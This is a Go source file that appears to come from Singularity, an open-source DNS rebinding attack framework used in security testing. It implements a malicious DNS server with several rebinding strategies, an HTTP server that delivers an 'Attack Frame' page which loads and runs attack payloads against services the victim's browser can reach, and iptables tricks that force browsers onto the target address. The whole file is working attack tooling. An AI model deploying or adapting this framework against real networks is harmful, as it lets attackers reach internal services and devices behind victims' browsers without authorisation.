package singularity

import (
	"context"
	crand "crypto/rand"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"html/template"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/miekg/dns"
	"github.com/nccgroup/singularity/golang"
)

/*** General Stuff ***/

// DNSRebindingStrategy maps a DNS Rebinding strategy name to a function
var DNSRebindingStrategy = map[string]func(session string, dcss *DNSClientStateStore, q dns.Question) []string{
	"rr": DNSRebindFromQueryRoundRobin,
	"fs": DNSRebindFromQueryFirstThenSecond,
	"rd": DNSRebindFromQueryRandom,
	"ma": DNSRebindFromQueryMultiA,
}

// DNSClientStateStore stores DNS sessions
// It permits to respond to multiple clients
// based on their current DNS rebinding state.
// Must use RO or RW mutex to access.
type DNSClientStateStore struct {
	sync.RWMutex
	Sessions map[string]*DNSClientState
}

// AppConfig stores running parameter of singularity server.
type AppConfig struct {
	HTTPServerPorts              []int
	ResponseIPAddr               string
	ResponseReboundIPAddr        string
	RebindingFn                  func(session string, dcss *DNSClientStateStore, q dns.Question) []string
	RebindingFnName              string
	ResponseReboundIPAddrtimeOut int
	AllowDynamicHTTPServers      bool
	DNSServerBindAddr            string
	WsHTTPProxyServerPort        int
	EnableLinuxTProxySupport     bool
	IgnoreDNSRequestFrom         []net.IP
}

// GenerateRandomString returns a secure random hexstring, 20 chars long
func GenerateRandomString() (string, error) {
	c := 20
	b := make([]byte, c)
	_, err := crand.Read(b)
	if err != nil {
		return "", err
	}
	return hex.EncodeToString(b), nil
}

/*** DNS Stuff ***/

// DNSClientState holds the current rebinding state of client.
type DNSClientState struct {
	FirstQueryTime               time.Time
	LastQueryTime                time.Time
	CurrentQueryTime             time.Time
	ResponseIPAddr               string
	ResponseReboundIPAddr        string
	LastResponseReboundIPAddr    int
	ResponseReboundIPAddrtimeOut int
	FirewalledOnce               bool
}

// ExpireOldEntries expire DNS Client Sessions
// that existed longer than duration
// Old entries are expire at a provided interval
// Someone could possibly fill memory before old entries are expired
func (dcss *DNSClientStateStore) ExpireOldEntries(duration time.Duration) {
	dcss.Lock()
	for sk, sv := range dcss.Sessions {
		diff := time.Since(sv.LastQueryTime)
		if (!sv.LastQueryTime.IsZero()) && (diff > duration) {
			delete(dcss.Sessions, sk)
		}
	}
	dcss.Unlock()
}

// DNSQuery is a convenience structure to hold
// the parsed DNS query of a client.
type DNSQuery struct {
	ResponseIPAddr        string
	ResponseReboundIPAddr string
	Session               string
	DNSRebindingStrategy  string
	Domain                string
}

// NewDNSQuery parses DNS query string
// and returns a DNSQuery structure.
// "-" is used a field delimitor in query string
// if target contains a CNAME instead of an IP address
// and if CNAME includes any "-",
// then each of these "-" must be escaped with another "-"
// Updated format:
// s-hexstring1.hexstring2-session-method-e.attackerdomain
// where hexstring1 and hexstring2 are fully expanded v4 or v6 IP adddresses
// (8 or 16 bytes long)

func NewDNSQuery(qname string) (*DNSQuery, error) {
	name := new(DNSQuery)

	qname = strings.Replace(qname, "--", "_", -1)

	if !strings.HasPrefix(qname, "s-") {
		return name, errors.New("cannot find start tag in DNS query")
	}

	qname = strings.TrimPrefix(qname, "s-")

	split1 := strings.Split(qname, "-e.")

	if len(split1) != 2 {
		return name, errors.New("cannot find end tag in DNS query")
	}

	domainSuffix := split1[1]

	if (len(domainSuffix) < 3) && !strings.ContainsAny(domainSuffix, ".") {
		return name, errors.New("cannot parse domain in DNS query")
	}

	split2 := strings.Split(split1[0], "-")

	if len(split2) != 3 {
		return name, errors.New("cannot parse start of DNS query")
	}

	eleme0, eleme1, found := strings.Cut(split2[0], ".")

	if !found {
		return name, errors.New("cannot find attacker and target hosts")
	}

	elem0, err := hex.DecodeString(eleme0)
	if err != nil {
		return name, fmt.Errorf("failed to decode IP address of the first host in DNS query")
	}

	elem0ip := net.IP(elem0)
	var elem1Str string
	elem1, err := hex.DecodeString(eleme1)
	if err != nil {
		// probably a name, not an IP address
		elem1Str = eleme1

		if elem1Str != "localhost" {
			elem1Str = strings.Replace(elem1Str, "_", "-", -1)
			if golang.IsDomainName(elem1Str) == false {
				return name, errors.New("cannot parse CNAME of second host in DNS query")
			}
		}
	} else {
		elem1ip := net.IP(elem1)
		elem1Str = elem1ip.String()
	}

	name.ResponseIPAddr = elem0ip.String()
	name.ResponseReboundIPAddr = elem1Str

	name.Session = split2[1]

	if len(name.Session) == 0 {
		return name, errors.New("cannot parse session in DNS query")
	}

	name.DNSRebindingStrategy = split2[2]
	name.Domain = fmt.Sprintf(".%v", domainSuffix)

	return name, nil
}

func NewDNSQueryFromOrigin(origin string) (*DNSQuery, error) {
	s := strings.TrimPrefix(origin, "http://")
	return NewDNSQuery(strings.Split(s, ":")[0])
}

// dnsRebindFirst is a convenience function
// that always returns the first host in DNS query
func dnsRebindFirst(session string, dcss *DNSClientStateStore, q dns.Question) []string {
	dcss.RLock()
	answers := []string{dcss.Sessions[session].ResponseIPAddr}
	dcss.RUnlock()
	return answers
}

// DNSRebindFromQueryFirstThenSecond is a response handler to DNS queries
// It extracts the hosts in the DNS query string
// It first returns the first host once in the DNS query string
// then the second host in all subsequent queries for a period of time timeout.
func DNSRebindFromQueryFirstThenSecond(session string, dcss *DNSClientStateStore, q dns.Question) []string {
	dcss.RLock()
	answers := []string{dcss.Sessions[session].ResponseIPAddr}
	elapsed := dcss.Sessions[session].CurrentQueryTime.Sub(dcss.Sessions[session].LastQueryTime)
	timeOut := dcss.Sessions[session].ResponseReboundIPAddrtimeOut

	log.Printf("DNS: in DNSRebindFromQueryFirstThenSecond\n")

	if elapsed < (time.Second * time.Duration(timeOut)) {
		answers[0] = dcss.Sessions[session].ResponseReboundIPAddr
	}

	dcss.RUnlock()
	return answers
}

// DNSRebindFromQueryRandom is a response handler to DNS queries
// It extracts the two hosts in the DNS query string
// then returns either extracted hosts randomly
func DNSRebindFromQueryRandom(session string, dcss *DNSClientStateStore, q dns.Question) []string {
	dcss.RLock()
	answers := []string{dcss.Sessions[session].ResponseIPAddr}
	hosts := []string{dcss.Sessions[session].ResponseIPAddr, dcss.Sessions[session].ResponseReboundIPAddr}
	dcss.RUnlock()

	log.Printf("DNS: in DNSRebindFromQueryRandom\n")

	answers[0] = hosts[rand.Intn(len(hosts))]

	return answers
}

// DNSRebindFromQueryRoundRobin is a response handler to DNS queries
// It extracts the two hosts in the DNS query string
// then returns the extracted hosts in a round robin fashion
func DNSRebindFromQueryRoundRobin(session string, dcss *DNSClientStateStore, q dns.Question) []string {
	dcss.RLock()
	answers := []string{dcss.Sessions[session].ResponseIPAddr}
	ResponseIPAddr := dcss.Sessions[session].ResponseIPAddr
	ResponseReboundIPAddr := dcss.Sessions[session].ResponseReboundIPAddr
	LastResponseReboundIPAddr := dcss.Sessions[session].LastResponseReboundIPAddr
	dcss.RUnlock()

	log.Printf("DNS: in DNSRebindFromQueryRoundRobin\n")

	hosts := []string{"", ResponseIPAddr, ResponseReboundIPAddr}
	switch LastResponseReboundIPAddr {
	case 0:
		LastResponseReboundIPAddr = 1
	case 1:
		LastResponseReboundIPAddr = 2
	case 2:
		LastResponseReboundIPAddr = 1
	}

	dcss.Lock()
	dcss.Sessions[session].LastResponseReboundIPAddr = LastResponseReboundIPAddr
	dcss.Unlock()

	answers[0] = hosts[LastResponseReboundIPAddr]

	return answers
}

// DNSRebindFromQueryMultiA s a response handler to DNS queries
// It extracts the two hosts in the DNS query string
// then returns the extracted hosts as multiple DNS A records
func DNSRebindFromQueryMultiA(session string, dcss *DNSClientStateStore, q dns.Question) []string {
	var answers []string
	dcss.RLock()
	if dcss.Sessions[session].FirewalledOnce == true {
		// we try to prevent browsers like Chrome for reverting back to first IP address
		answers = []string{dcss.Sessions[session].ResponseReboundIPAddr}
	} else {
		answers = []string{dcss.Sessions[session].ResponseIPAddr, dcss.Sessions[session].ResponseReboundIPAddr}
	}
	dcss.RUnlock()
	log.Printf("DNS: in DNSRebindFromQueryMultiA\n")
	return answers
}

func addrInIPAddressList(addr net.Addr, ips []net.IP) bool {
	var addrIP net.IP

	switch a := addr.(type) {
	case *net.TCPAddr:
		addrIP = a.IP
	case *net.UDPAddr:
		addrIP = a.IP
	case *net.IPAddr:
		addrIP = a.IP
	default:
		return false
	}

	for _, ip := range ips {
		if ip.Equal(addrIP) {
			return true
		}
	}
	return false
}

// MakeRebindDNSHandler generates a DNS request handler
// based on app settings.
// This is the core DNS queries handling loop
func MakeRebindDNSHandler(appConfig *AppConfig, dcss *DNSClientStateStore) dns.HandlerFunc {
	return func(w dns.ResponseWriter, r *dns.Msg) {
		name := &DNSQuery{}
		clientState := &DNSClientState{}
		now := time.Now()
		rebindingFn := appConfig.RebindingFn

		m := new(dns.Msg)
		m.SetReply(r)
		m.Compress = false

		switch r.Opcode {
		case dns.OpcodeQuery:
			for _, q := range m.Question {
				switch q.Qtype {
				case dns.TypeA, dns.TypeAAAA:
					log.Printf("DNS: Received %v query: %v from: %v\n", q.Qtype, q.Name, w.RemoteAddr().String())

					if addrInIPAddressList(w.RemoteAddr(), appConfig.IgnoreDNSRequestFrom) {
						log.Printf("DNS: Ignoring (ignoreDNSRequestFrom) %v query: %v from: %v\n", q.Qtype, q.Name, w.RemoteAddr().String())
						return
					}

					qnameLower := strings.ToLower(q.Name)

					// Handling query with potential QNAME minimization
					if !strings.HasPrefix(qnameLower, "s-") {

						if net.ParseIP(appConfig.ResponseIPAddr) == nil {
							// DNS: Singularity external IP address apparently not configured or misconfigured
							// (`-responseIPAddr` command line flag). Ignoring query.
							return
						}

						var response string
						address := net.ParseIP(appConfig.ResponseIPAddr)
						if address != nil {
							if address.To4() != nil {
								response = fmt.Sprintf("%s %s IN A %s", q.Name, "0", appConfig.ResponseIPAddr)
							} else {
								response = fmt.Sprintf("%s %s IN AAAA %s", q.Name, "0", appConfig.ResponseIPAddr)
							}
						} else {
							log.Printf("DNS: failed to parse our application configuration response IP address: %v\n", appConfig.ResponseIPAddr)
						}

						rr, err := dns.NewRR(response)
						if err == nil {
							m.Answer = append(m.Answer, rr)
							log.Printf("DNS: response to %v (DNS Query Name Minimisation): %v %v\n", w.RemoteAddr().String(), response, q.Name)
							w.WriteMsg(m)
							return
						}

					}

					// Preparing to update the client DNS query state
					clientState.FirstQueryTime = now
					clientState.CurrentQueryTime = now
					clientState.ResponseReboundIPAddrtimeOut = appConfig.ResponseReboundIPAddrtimeOut

					var err error
					name, err = NewDNSQuery(qnameLower)

					if err != nil {
						log.Printf("DNS: Parsing of query failed: %v, with error: %v\n", name, err)
						return
					}

					log.Printf("DNS: Parsed query from %v: %v\n", w.RemoteAddr().String(), name)

					clientState.ResponseIPAddr = name.ResponseIPAddr
					clientState.ResponseReboundIPAddr = name.ResponseReboundIPAddr
					if fn, ok := DNSRebindingStrategy[name.DNSRebindingStrategy]; ok {
						rebindingFn = fn
					}

					dcss.Lock()
					_, keyExists := dcss.Sessions[name.Session]
					log.Printf("DNS: session exists: %v\n", keyExists)

					if keyExists != true {
						// New session
						dcss.Sessions[name.Session] = clientState
					}
					dcss.Unlock()

					answers := rebindingFn(name.Session, dcss, q)

					response := []string{}

					respond := func(question, time, answer string, additionalRecord bool) (string, error) {
						// we respond with one A or AAAA record
						var response string
						address := net.ParseIP(answer)

						if address != nil {

							var recordType string
							if address.To4() == nil {
								recordType = "AAAA" // IPv6
							} else {
								recordType = "A" // IPv4
							}

							isMatch := (recordType == "AAAA" && q.Qtype == dns.TypeAAAA) ||
								(recordType == "A" && q.Qtype == dns.TypeA)

							if isMatch {
								response = fmt.Sprintf("%s %s IN %s %s", question, time, recordType, answer)
							} else {
								if additionalRecord {
									response = fmt.Sprintf("%s %s IN %s %s", question, time, recordType, answer)
								} else {
									return "", fmt.Errorf("mismatch between query and response types) for %q", name)
								}
							}
						} else {
							// Otherwise, we respond with a CNAME record
							response = fmt.Sprintf("%s 10 IN CNAME %s.", question, answer)
						}
						return response, nil
					}

					if len(answers) == 1 { //we return only one answer
						res, err := respond(q.Name, "0", answers[0], false)
						if err != nil {
							w.WriteMsg(m)
							log.Printf("DNS: response to %v: %v, sending empty response\n", w.RemoteAddr().String(), err)
							return
						}
						response = append(response, res)
					} else { // We respond with multiple answers
						res, err := respond(q.Name, "10", answers[0], true)
						if err != nil {
							w.WriteMsg(m)
							log.Printf("DNS: response to %v: %v, sending empty response\n", w.RemoteAddr().String(), err)
							return
						}
						response = append(response, res)

						res, err = respond(q.Name, "0", answers[1], true)

						if err != nil {
							w.WriteMsg(m)
							log.Printf("DNS: response to %v: %v, sending empty response\n", w.RemoteAddr().String(), err)
							return
						}
						response = append(response, res)
					}

					dcss.Lock()
					dcss.Sessions[name.Session].CurrentQueryTime = now
					dcss.Sessions[name.Session].LastQueryTime = now
					dcss.Unlock()

					for _, resp := range response {

						rr, err := dns.NewRR(resp)
						if err == nil {
							m.Answer = append(m.Answer, rr)
							log.Printf("DNS: response to %v: %v\n", w.RemoteAddr().String(), resp)
						}
					}
				}
			}
		}
		w.WriteMsg(m)
	}
}

/*** HTTP Stuff ***/

// DefaultHeadersHandler is a HTTP handler that adds default headers to responses
// for all routes
type DefaultHeadersHandler struct {
	NextHandler http.Handler
}

// HTTPClientInfoHandler is a HTTP handler to provide HTTP client information
// including IP address to HTTP cllients
type HTTPClientInfoHandler struct {
	IPAddress string
	Port      string
}

// PayloadTemplateHandler is a HTTP handler to deliver payloads to HTTP clients
type PayloadTemplateHandler struct {
}

type templatePayloadData struct {
	JavaScriptCode template.JS
}

// HTTPServerStoreHandler holds the list of HTTP servers
// Many servers at startup and one (1) dynamically instantianted server
// Access to the servers list must be performed via mutex
type HTTPServerStoreHandler struct {
	Errc                    chan HTTPServerError // communicates http server errors
	AllowDynamicHTTPServers bool
	sync.RWMutex
	DynamicServers        []*http.Server
	StaticServers         []*http.Server
	Dcss                  *DNSClientStateStore
	Wscss                 *WebsocketClientStateStore
	WsHTTPProxyServerPort int
	AuthToken             string
}

// IPTablesHandler is a HTTP handler that adds/removes iptables rules
// if the DNS rebinding strategy is to respond with multiple A records.
type IPTablesHandler struct {
}

type httpServerInfo struct {
	Port string
}

// HTTPServersConfig is a stucture that is returned
// to JS client to inform about Singularity HTTP ports
// and whether dynamic HTTP server allocation is allowed
type HTTPServersConfig struct {
	ServerInformation       []httpServerInfo
	AllowDynamicHTTPServers bool
}

// HTTP Handler for "/" - Add headers then calls next NextHandler()

func (d *DefaultHeadersHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate") // HTTP 1.1
	w.Header().Set("Pragma", "no-cache")                                   // HTTP 1.0
	w.Header().Set("Expires", "0")                                         // Proxies
	w.Header().Set("X-DNS-Prefetch-Control", "off")                        //Chrome
	w.Header().Set("X-Singularity-Of-Origin", "t")
	d.NextHandler.ServeHTTP(w, r)
}

// HTTP Handler for "/clientinfo"
func (hcih *HTTPClientInfoHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	log.Printf("HTTP: %v %v from %v", r.Method, r.RequestURI, r.RemoteAddr)

	w.Header().Set("Content-Type", "application/json; charset=UTF-8")

	emptyResponse, _ := json.Marshal(hcih)
	splitted := strings.Split(r.RemoteAddr, ":")
	hcih.IPAddress = splitted[0]
	hcih.Port = splitted[1]
	clientInfoResponse, _ := json.Marshal(hcih)

	switch r.Method {
	case "GET":
		fmt.Fprintf(w, "%v", string(clientInfoResponse))
	default:
		http.Error(w, string(emptyResponse), 400)
		return
	}
}

// https://siongui.github.io/2016/03/06/go-concatenate-js-files/
func concatenateJS(dirPath string) []byte {
	var jsCode []byte
	// walk all files in directory
	filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
		if !info.IsDir() && strings.HasSuffix(info.Name(), ".js") {
			log.Printf("HTTP: concatenating %v ...", path)
			b, err := ioutil.ReadFile(path)
			if err != nil {
				return err
			}
			jsCode = append(jsCode, b...)
		}
		return nil
	})
	return jsCode
}

// HTTP Handler for "/soopayload"
func (pth *PayloadTemplateHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	log.Printf("HTTP: %v %v from %v", r.Method, r.RequestURI, r.RemoteAddr)

	const tpl = `<!doctype html>
	<html><head><title>Attack Frame</title><script src="payload.js"></script>
	<script>
	{{ .JavaScriptCode }}

	function attack(payload, headers, cookie, body, wsproxyport) {
		const titleEl = document.getElementById('title');
		if (payload === 'automatic') {
			(async function loop() {
				for (let payload in Registry) {
					console.log("Trying payload: " + payload + " for frame: " + window.location);
					await Registry[payload].isService(headers, cookie, body)
						.then(response => {
							if (response === true) {
								titleEl.innerText = payload;
								console.log("Payload: " + payload + " has identified a service for frame: " + window.location);
								Registry[payload].attack(headers, cookie, body, wsproxyport);
								return;
							} else {
								console.log("Payload: " + payload + " has rejected a service for frame: " + window.location);
							}
						})
				}
			})();
		} else {
			titleEl.innerText = payload;
			Registry[payload].attack(headers, cookie, body, wsproxyport);
		}
	}
	</script></head>
	<body onload="begin('/')")><h3 id='title'>Rebinding...</h3>
	<p><span id='hostname'></span>. <span id='rebindingstatus'>This page is waiting for a DNS update.</span>
	<span id='payloadstatus'></span></p>
	</body></html>`

	t, err := template.New("webpage").Parse(tpl)
	if err != nil {
		log.Printf("PayloadTemplateHandler: could not parse template: %v\n", err)
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}
	templateData := templatePayloadData{JavaScriptCode: template.JS(concatenateJS("html/payloads"))}
	err = t.Execute(w, templateData)
	if err != nil {
		log.Printf("PayloadTemplateHandler: could not execute template: %v\n", err)
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}
}

// HTTP Handler for /servers
func (hss *HTTPServerStoreHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {

	log.Printf("HTTP: %v %v from %v", r.Method, r.RequestURI, r.RemoteAddr)

	w.Header().Set("Content-Type", "application/json; charset=UTF-8")

	serverInfo := httpServerInfo{}
	emptyResponse, _ := json.Marshal(serverInfo)
	emptyResponseStr := string(emptyResponse)
	serverInfos := make([]httpServerInfo, 0)

	switch r.Method {
	case "GET":

		hss.RLock()
		for _, server := range hss.StaticServers {
			if server != nil {
				staticServerInfo := httpServerInfo{}
				staticServerInfo.Port = strings.Split(server.Addr, ":")[1]
				serverInfos = append(serverInfos, staticServerInfo)
			}
		}
		for _, server := range hss.DynamicServers {
			if server != nil {
				dynamicServerInfo := httpServerInfo{}
				dynamicServerInfo.Port = strings.Split(server.Addr, ":")[1]
				serverInfos = append(serverInfos, dynamicServerInfo)
			}
		}
		hss.RUnlock()

		myHTTPServersConfig := HTTPServersConfig{ServerInformation: serverInfos,
			AllowDynamicHTTPServers: hss.AllowDynamicHTTPServers}

		s, err := json.Marshal(myHTTPServersConfig)

		println(string(s))

		if err != nil {
			http.Error(w, emptyResponseStr, 500)
			return
		}

		fmt.Fprintf(w, "%v", string(s))

	case "PUT":

		if hss.AllowDynamicHTTPServers == false {
			http.Error(w, emptyResponseStr, 400)
			return
		}

		r.Body = http.MaxBytesReader(w, r.Body, 5000)

		body, err := ioutil.ReadAll(r.Body)
		if err != nil {
			http.Error(w, emptyResponseStr, 400)
			return
		}

		err = json.Unmarshal(body, &serverInfo)
		if err != nil {
			http.Error(w, emptyResponseStr, 400)
			return
		}

		port, err := strconv.Atoi(serverInfo.Port)
		if err != nil {
			http.Error(w, emptyResponseStr, 400)
			return
		}

		hss.Lock()
		if hss.DynamicServers[0] != nil {
			StopHTTPServer(hss.DynamicServers[0], hss)
			hss.DynamicServers[0] = nil
		}
		hss.Unlock()

		httpServer := NewHTTPServer(port, hss, hss.Dcss, hss.Wscss)
		httpServerErr := StartHTTPServer(httpServer, hss, true, false)

		if httpServerErr != nil {
			http.Error(w, emptyResponseStr, 400)
			return
		}

		s, err := json.Marshal(serverInfo)
		if err != nil {
			http.Error(w, emptyResponseStr, 400)
			return
		}

		fmt.Fprintf(w, "%v", string(s))

	default:
		http.Error(w, emptyResponseStr, 400)
		return
	}

}

func (ipt *IPTablesHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	log.Printf("HTTP: %v %v from %v", r.Method, r.RequestURI, r.RemoteAddr)

	hj, ok := w.(http.Hijacker)
	if !ok {
		log.Printf("HTTP: webserver doesn't support hijacking\n")
		return
	}
	conn, bufrw, err := hj.Hijack()
	if err != nil {
		log.Printf("HTTP: could not hijack http server connection: %v\n", err.Error())
		return
	}

	defer conn.Close()

	log.Printf("HTTP: implementing firewall rule for %v\n", conn.RemoteAddr().String())

	dstAddr, dstPort, err := net.SplitHostPort(conn.LocalAddr().String())
	if err != nil {
		log.Printf("HTTP: could not prepare firewall rule for %v\n", conn.LocalAddr().String())
		return
	}

	srcAddr, srcPort, err := net.SplitHostPort(conn.RemoteAddr().String())
	if err != nil {
		log.Printf("HTTP: could not prepare firewall rule for %v\n", conn.RemoteAddr().String())
		return
	}

	ip := net.ParseIP(srcAddr)
	if ip == nil {
		log.Printf("HTTP: could not prepare firewall rule for %v\n", srcAddr)
		return
	}

	// If ip.To4() is not nil, it's IPv4; otherwise, it's IPv6

	ipTablesRule := NewIPTableRule(srcAddr, srcPort, dstAddr, dstPort, ip.To4() == nil)
	go func(rule *IPTablesRule) {
		time.Sleep(time.Second * time.Duration(5))
		ipTablesRule.RemoveRule()
	}(ipTablesRule)

	ipTablesRule.AddRule()

	//Instead of writing the beginning of a valid HTTP response
	// e.g. bufrw.WriteString("HTTP")
	// that works with most browsers except (old) Edge,
	// we write the token value for Edge to determine whether it is connected to
	// target or attacker. TODO make this value a startup parameter.
	bufrw.WriteString("thisismytesttoken")
	bufrw.Flush()

}

// DelayDOMLoadHandler is a HTTP handler that forces browsers
// to wait for more data thus delaying DOM load event.
type DelayDOMLoadHandler struct{}

func (h *DelayDOMLoadHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	log.Printf("HTTP: %v %v from %v", r.Method, r.RequestURI, r.RemoteAddr)
	hj, ok := w.(http.Hijacker)
	if !ok {
		log.Printf("HTTP: webserver doesn't support hijacking\n")
		return
	}
	conn, bufrw, err := hj.Hijack()
	if err != nil {
		log.Printf("HTTP: could not hijack http server connection: %v\n", err.Error())
		return
	}

	defer conn.Close()

	bufrw.WriteString("HTTP/1.1 200 OK\r\n" +
		"Cache-Control: no-cache, no-store, must-revalidate\r\nContent-Length: 4\r\nContent-Type: text/html\r\n" +
		"Expires: 0\r\nPragma: no-cache\r\nX-Dns-Prefetch-Control: off\r\nConnection: close\r\n\r\n<ht")
	bufrw.Flush()
	time.Sleep(90 * time.Second)
}

// NewHTTPServer configures a HTTP server
func NewHTTPServer(port int, hss *HTTPServerStoreHandler, dcss *DNSClientStateStore,
	wscss *WebsocketClientStateStore) *http.Server {
	d := &DefaultHeadersHandler{NextHandler: http.FileServer(http.Dir("./html"))}
	hcih := &HTTPClientInfoHandler{}
	pth := &PayloadTemplateHandler{}
	dpth := &DefaultHeadersHandler{NextHandler: pth}
	ipth := &IPTablesHandler{}
	delayDOMLoadHandler := &DelayDOMLoadHandler{}
	//websocketHandler := &WebsocketHandler{dcss: dcss, wscss: wscss}

	h := http.NewServeMux()

	h.HandleFunc("/", func(w http.ResponseWriter, req *http.Request) {
		//We handle the particular case where we use multiple A records DNS rebinding.
		// We hijack the connection from the HTTP server
		// * if we have a DNS session with the client browser
		// * and if this session is more than 3 seconds.
		// Then we create a Linux iptables rule that drops the connection from the browser
		// using an unsolicited TCP RST packet.
		// The connection being dropped is defined by the source address,
		// source port range(current port + 10) and the server address and port.
		// The rule is removed after 10 seconds after being implemented.
		// In the singularity manager interface,
		// we need to ensure that the polling interval is fast, e.g. 1 sec.

		log.Printf("HTTP: %v %v from %v", req.Method, req.RequestURI, req.RemoteAddr)

		name, err := NewDNSQuery(req.Host)
		if err == nil {

			dcss.RLock()
			_, keyExists := dcss.Sessions[name.Session]
			log.Printf("HTTP: matching DNS session exists: %v\n", keyExists)
			dcss.RUnlock()

			if keyExists == true {
				dcss.RLock()
				elapsed := time.Now().Sub(dcss.Sessions[name.Session].FirstQueryTime)
				dcss.RUnlock()

				if name.DNSRebindingStrategy == "ma" {
					if elapsed > (time.Second * time.Duration(3)) {
						log.Printf("HTTP: attempting Multiple A records rebinding for: %v", name)
						dcss.Lock()
						dcss.Sessions[name.Session].FirewalledOnce = true
						dcss.Unlock()
						ipth.ServeHTTP(w, req)
						return
					}
				}
			}

		}
		d.ServeHTTP(w, req)
	})

	h.Handle("/clientinfo", hcih)
	h.Handle("/soopayload.html", dpth)
	h.Handle("/servers", hss)
	h.Handle("/delaydomload", delayDOMLoadHandler)
	//h.Handle("/soows", websocketHandler)

	httpServer := &http.Server{Addr: ":" + strconv.Itoa(port), Handler: h}

	// drop browser connections after delivering
	// so they dont keep socket alive and facilitate rebinding.
	httpServer.SetKeepAlivesEnabled(false)

	return httpServer
}

// HTTPServerError is used to report issues with an HTTP instance
// when started or closed
type HTTPServerError struct {
	Err  error
	Port string
}

// Linux Transparent Proxy Support
// https://www.kernel.org/doc/Documentation/networking/tproxy.txt
// e.g. `sudo iptables -t mangle -I PREROUTING -d ext_ip_address
// -p tcp --dport 8080 -j TPROXY --on-port=80 --on-ip=ext_ip_address
// will redirect external port 8080 on port 80 of Singularity
func useIPTransparent(network, address string, conn syscall.RawConn) error {
	return conn.Control(func(descriptor uintptr) {
		syscall.SetsockoptInt(int(descriptor), syscall.IPPROTO_IP, syscall.IP_TRANSPARENT, 1)
	})
}

// StartHTTPServer starts an HTTP server
// and adds it to  dynamic (if dynamic is true) or static HTTP Store
func StartHTTPServer(s *http.Server, hss *HTTPServerStoreHandler, dynamic bool, tproxy bool) error {

	var err error
	var l net.Listener

	if tproxy == true {
		listenConfig := &net.ListenConfig{Control: useIPTransparent}
		l, err = listenConfig.Listen(context.Background(), "tcp", s.Addr)
	} else {
		l, err = net.Listen("tcp", s.Addr)
	}
	if err != nil {
		return err
	}

	hss.Lock()
	if dynamic == true {
		found := false
		for _, v := range hss.StaticServers {
			if (v != nil) && (v.Addr == s.Addr) {
				found = true
				break
			}
		}
		if found != true {
			hss.DynamicServers[0] = s
		}

	} else {
		hss.StaticServers = append(hss.StaticServers, s)
	}

	hss.Unlock()

	go func() {
		log.Printf("HTTP: starting HTTP Server on %v\n", s.Addr)
		routineErr := s.Serve(l)
		hss.Errc <- HTTPServerError{Err: routineErr, Port: s.Addr}
	}()

	return err

}

// StopHTTPServer stops an HTTP server
func StopHTTPServer(s *http.Server, hss *HTTPServerStoreHandler) {
	log.Printf("HTTP: stopping HTTP Server on %v\n", s.Addr)
	s.Close()
}
